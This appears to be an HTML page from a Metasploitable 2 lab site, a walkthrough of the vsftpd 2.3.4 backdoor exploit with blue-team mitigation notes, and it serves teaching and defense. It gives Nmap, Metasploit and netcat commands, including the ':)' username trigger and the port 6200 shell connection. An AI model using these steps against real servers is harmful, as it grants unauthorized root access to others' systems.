@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FTP — vsftpd 2.3.4 Backdoor | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a>
+    <span>/</span>
+    <a href="../index.html#modules">Modules</a>
+    <span>/</span>
+    <span style="color:var(--text)">FTP</span>
+  </div>
+</div>
+
+<!-- MODULE HERO -->
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 21/tcp — File Transfer Protocol</p>
+        <h2>vsftpd 2.3.4 — Backdoor Exploit</h2>
+        <p class="sub-title">Unauthenticated Remote Code Execution → Root Shell</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>CVE-2011-2532</strong></span>
+          <span class="pill">Port: <strong>21/tcp</strong></span>
+          <span class="pill">Impact: <strong>Root RCE</strong></span>
+          <span class="pill">Auth Required: <strong>None</strong></span>
+          <span class="pill">Tool: <strong>Metasploit / Netcat</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-critical" style="font-size:.85rem;padding:.4rem 1rem">Critical</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Vulnerability Name</div><div class="ov-item-value">vsftpd 2.3.4 Supply-Chain Backdoor</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">Unauthenticated RCE</div></div>
+        <div><div class="ov-item-label">Module Used</div><div class="ov-item-value mono">exploit/unix/ftp/vsftpd_234_backdoor</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--green)">✓ Root Shell Obtained</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <!-- SECTION 1 -->
+      <div class="step-section" id="service-overview">
+        <div class="step-label">
+          <div class="step-num">01</div>
+          <h3>Service Overview</h3>
+        </div>
+        <p>FTP (File Transfer Protocol) is a standard network protocol for transferring files between a client and server. On Metasploitable 2, FTP runs on <strong>port 21</strong> via <strong>vsftpd 2.3.4</strong> — a version that was compromised in a supply-chain attack.</p>
+        <div class="callout">
+          This was not a logic flaw — it was a malicious backdoor injected into the vsftpd source code. When any username ending in <code>:)</code> is submitted during login, the backdoor opens a shell on port 6200.
+        </div>
+      </div>
+
+      <!-- SECTION 2 -->
+      <div class="step-section" id="enumeration">
+        <div class="step-label">
+          <div class="step-num">02</div>
+          <h3>Service Detection &amp; Enumeration</h3>
+        </div>
+        <p>Run Nmap to identify the FTP service version running on port 21:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 21</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap FTP Service Version Scan</span>
+          </div>
+          <img src="../FTP/FTP_Service_Nmap_Scan.png" alt="FTP Nmap Scan" loading="lazy" />
+        </div>
+        <p>Nmap identifies <code>vsftpd 2.3.4</code> — a well-known vulnerable version, immediately recognizable to any experienced attacker.</p>
+      </div>
+
+      <!-- SECTION 3 -->
+      <div class="step-section" id="metasploit">
+        <div class="step-label">
+          <div class="step-num">03</div>
+          <h3>Exploitation via Metasploit</h3>
+        </div>
+        <p>Launch Metasploit and search for the vsftpd module:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">msfconsole</span>
+<span class="cmt"># Inside msfconsole:</span>
+<span class="kw">search</span> vsftpd
+<span class="kw">use</span> <span class="pth">exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="kw">set</span> RHOSTS <span class="str">&lt;target-ip&gt;</span>
+<span class="kw">set</span> RPORT <span class="num">21</span>
+<span class="kw">run</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Metasploit FTP Exploit — Root Shell Obtained</span>
+          </div>
+          <img src="../FTP/Metasploit_FTP_Exploit.png" alt="Metasploit FTP Exploit" loading="lazy" />
+        </div>
+        <p>The shell spawned is a <strong>root-level shell</strong> — no privilege escalation step required. The backdoor runs with the same privileges as the vsftpd daemon, which is root.</p>
+      </div>
+
+      <!-- SECTION 4 -->
+      <div class="step-section" id="manual">
+        <div class="step-label">
+          <div class="step-num">04</div>
+          <h3>Manual Exploitation via Netcat</h3>
+        </div>
+        <p>The backdoor can also be triggered manually without Metasploit — useful when only basic tools are available:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmt"># Step 1: Connect to FTP and trigger the backdoor</span>
+<span class="cmd">nc</span> <span class="str">&lt;target-ip&gt;</span> <span class="num">21</span>
+<span class="cmt"># Type the following over the netcat session:</span>
+USER test<span class="str">:)</span>
+PASS anything
+
+<span class="cmt"># Step 2: In a new terminal, connect to the backdoor shell on port 6200</span>
+<span class="cmd">nc</span> <span class="str">&lt;target-ip&gt;</span> <span class="num">6200</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Manual Netcat Exploit — Port 6200 Shell</span>
+          </div>
+          <img src="../FTP/Netcat_FTP_Exploit.png" alt="Netcat FTP Exploit" loading="lazy" />
+        </div>
+      </div>
+
+      <!-- RESULTS -->
+      <div class="step-section" id="results">
+        <div class="step-label">
+          <div class="step-num">05</div>
+          <h3>Results &amp; Impact</h3>
+        </div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Root shell obtained with no credentials required</li>
+            <li>No post-exploitation privilege escalation needed</li>
+            <li>Full system compromise in a single step</li>
+            <li>Demonstrates the catastrophic impact of supply-chain attacks</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Upgrade to vsftpd 2.3.5 or later immediately — 2.3.4 is permanently backdoored</li>
+            <li>Alert on vsftpd 2.3.4 running anywhere in production</li>
+            <li>Monitor FTP logs for usernames containing <code>:)</code></li>
+            <li>Watch for unexpected outbound connections on port 6200</li>
+            <li>Replace FTP with SFTP — FTP transmits credentials in plaintext</li>
+            <li>Apply network-level firewall rules to restrict FTP access</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- TOC -->
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Service Overview</a>
+      <a href="#enumeration">Enumeration</a>
+      <a href="#metasploit">Metasploit Exploit</a>
+      <a href="#manual">Manual / Netcat</a>
+      <a href="#results">Results &amp; Mitigation</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links">
+      <a href="./ssh.html">SSH →</a>
+      <a href="./smtp.html">SMTP →</a>
+    </div>
+  </div>
+</footer>
+
+<div id="lightbox" class="lightbox-overlay">
+  <button class="lightbox-close">✕</button>
+  <img src="" alt="" />
+</div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html>
